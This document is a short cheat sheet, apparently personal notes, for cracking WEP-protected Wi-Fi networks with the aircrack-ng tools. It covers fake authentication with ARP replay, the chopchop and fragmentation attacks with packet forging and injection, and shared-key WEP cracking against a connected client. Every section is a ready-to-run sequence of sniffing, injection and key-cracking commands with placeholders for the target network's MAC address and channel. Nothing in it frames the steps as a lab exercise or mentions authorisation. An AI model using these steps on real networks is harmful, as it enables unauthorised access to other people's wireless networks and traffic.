Hacking a Busy WEP network: (Fake Authentication Attacks)
---------------------------------------------------------
Force the network to create traffic with new IV's using fake auth
Associate to the network and replay an ARP traffic

Sniff:
airodump --bssid <MAC> --channel <#>  --write <filename> wlan0

Associate with the network: 
aireplay-ng --fakeauth 0 -a <Network Mac> -h <Your Mac address>  wlan0

Replay ARP Packets to generate traffic: 
aireplay-ng --arpreplay 0 -b <Network Mac> -h <Your Mac address>  wlan0

Crack the Key: 
aircrack-ng <filename.cap>



Hacking a Busy WEP network:  (Korek Chop Chop)
-----------------------------------------------
Determine the keystream and forge a new packet to inject into the network

Sniff:
airodump --bssid <MAC> --channel <#>  --write <filename> wlan0

Associate with the network: 
aireplay-ng --fakeauth 0 -a <Network Mac> -h <Your Mac address>  wlan0

Attack with the Chop Chop Attack
aireplay-ng --chopchop 0 -b <Network Mac> -h <Your Mac address>  wlan0

Forge a Packet:
packetforge-ng -0 -a <Network Mac> -h <Your Mac address> -k 255.255.255.255 -s 255.255.255.255 -y <file.xor> -w <filename>

Inject Forged Packet:  (Make sure your still associated)
aireplay-ng -2 -r <forgedpacketFile> wlan0

Crack the Key:  (after about 20k packets)
aircrack-ng <filename.cap>



Hacking a Busy WEP network:  (Fragmentation Attack)
---------------------------------------------------
Obtain 1500 bytes of PRGA and forge a new packet to generate IVs

Sniff:
airodump --bssid <MAC> --channel <#>  --write <filename> wlan0

Associate with the network: 
aireplay-ng --fakeauth 0 -a <Network Mac> -h <Your Mac address>  wlan0

Obtain a PRGA:  (will ask if you want to use a packet, try till you get a good one)
aireplay-ng --fragment -b <Network Mac> -h <Your Mac address>  wlan0

Forge a Packet:
packetforge-ng -0 -a <Network Mac> -h <Your Mac address> -k 255.255.255.255 -l 255.255.255.255 -y <file.xor> -w <filename>

Inject Forged Packet:  (Make sure your still associated)
aireplay-ng -2 -r <forgedpacketFile> wlan0

Crack the Key: 
aircrack-ng <filename.cap>


Cracking Shared Key(SKA) WEP:
-----------------------------
With these you cant associate without the key so fake auth wont work

Run Airodump: (Under auth you should see SKA )
airodump --bssid <MAC> --channel <#>  --write <filename> wlan0

ArpReplay attack against a connected client: 
aireplay-ng --arpreplay  -b <Network Mac> -h <Target Client Mac>  wlan0

Crack the Key: 
aircrack-ng <filename.cap>
